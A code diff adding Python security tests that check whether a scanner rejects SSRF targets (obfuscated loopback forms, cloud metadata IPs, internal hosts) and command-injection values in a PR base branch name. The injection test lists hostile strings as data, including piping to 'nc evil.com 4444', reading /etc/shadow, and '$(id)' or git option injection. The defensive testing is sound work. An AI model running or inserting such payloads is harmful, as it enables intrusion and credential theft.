@@ -468,6 +468,86 @@ class TestCategory10SSRF:
         with pytest.raises(InputValidationError):
             validate_ip_address("172.16.0.5", allow_private=False)
 
+    def test_ssrf_decimal_hex_octal_and_mapped_ipv6_blocked(self):
+        """Decimal, hex, octal, and IPv4-mapped IPv6 obfuscations targeting loopback/metadata are blocked."""
+        # Decimal integer 2130706433 == 127.0.0.1
+        with pytest.raises(InputValidationError):
+            validate_url("http://2130706433/admin")
+
+        # Hex integer 0x7f000001 == 127.0.0.1
+        with pytest.raises(InputValidationError):
+            validate_url("http://0x7f000001/admin")
+
+        # Octal dotted 0177.0.0.1 == 127.0.0.1
+        with pytest.raises(InputValidationError):
+            validate_url("http://0177.0.0.1/admin")
+
+        # IPv4-mapped IPv6 ::ffff:127.0.0.1
+        with pytest.raises(InputValidationError):
+            validate_url("http://[::ffff:127.0.0.1]/admin")
+
+    def test_network_scanner_target_validation_pre_dns_rejects_forbidden_targets(self):
+        """scanners.network.target_validation must reject forbidden targets BEFORE DNS resolution."""
+        from scanners.network.target_validation import normalize_target
+
+        forbidden_targets = [
+            "127.0.0.1",
+            "127.0.0.2:8443",
+            "localhost",
+            "localhost:443",
+            "http://localhost:8080",
+            "2130706433",
+            "0x7f000001",
+            "0177.0.0.1",
+            "169.254.169.254",
+            "100.100.100.200",
+            "metadata.google.internal",
+            "[::1]",
+            "[::ffff:127.0.0.1]",
+            "10.0.0.1",
+            "192.168.1.1",
+            "172.16.0.1",
+            "service.local",
+            "db.internal",
+        ]
+
+        for target in forbidden_targets:
+            with pytest.raises(ValueError, match=r"(SSRF violation|rejected)"):
+                normalize_target(target, default_port=443, allow_private=False)
+
+    def test_network_scanner_dns_rebinding_guard_rejects_restricted_ips(self):
+        """DNSRebindingGuard rejects loopback, metadata, decimal/hex/octal, and mapped IPv6."""
+        from scanners.network.security import DNSRebindingGuard, SSRFProtectionError
+
+        # Numeric and mapped representations
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("127.0.0.1")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("2130706433")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("0x7f000001")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("0177.0.0.1")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("169.254.169.254")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("100.100.100.200")
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.validate_ip_address("::ffff:127.0.0.1")
+
+        # Pre-DNS rejection in resolve_and_pin
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.resolve_and_pin("127.0.0.1", 443)
+
+        with pytest.raises(SSRFProtectionError):
+            DNSRebindingGuard.resolve_and_pin("localhost", 443)
+
 
 # ============================================================================
 # 11. COMMAND INJECTION
@@ -507,6 +587,28 @@ class TestCategory11CommandInjection:
         with pytest.raises(PermissionError):
             safe_exec_spec("git", ["clone", "url"], use_shell=True)
         assert safe_exec_spec("git", ["clone", "url"], use_shell=False) == ["git", "clone", "url"]
+
+    def test_ci_scanner_pr_base_command_injection_rejected(self):
+        """scanners.ci_scanner.resolve_pr_diff_files rejects command and option injection."""
+        from scanners.ci_scanner import resolve_pr_diff_files
+
+        dangerous_pr_bases = [
+            "main; touch /tmp/pwned",
+            "main && cat /etc/shadow",
+            "main | nc evil.com 4444",
+            "main `whoami`",
+            "main $(id)",
+            "--output=/tmp/evil",
+            "--upload-pack=evil",
+            "-Devil",
+        ]
+
+        for base in dangerous_pr_bases:
+            files, err = resolve_pr_diff_files(".", base)
+            assert files == []
+            assert err is not None
+            assert "rejected" in err.lower() or "invalid" in err.lower()
+
 
 
 # ============================================================================
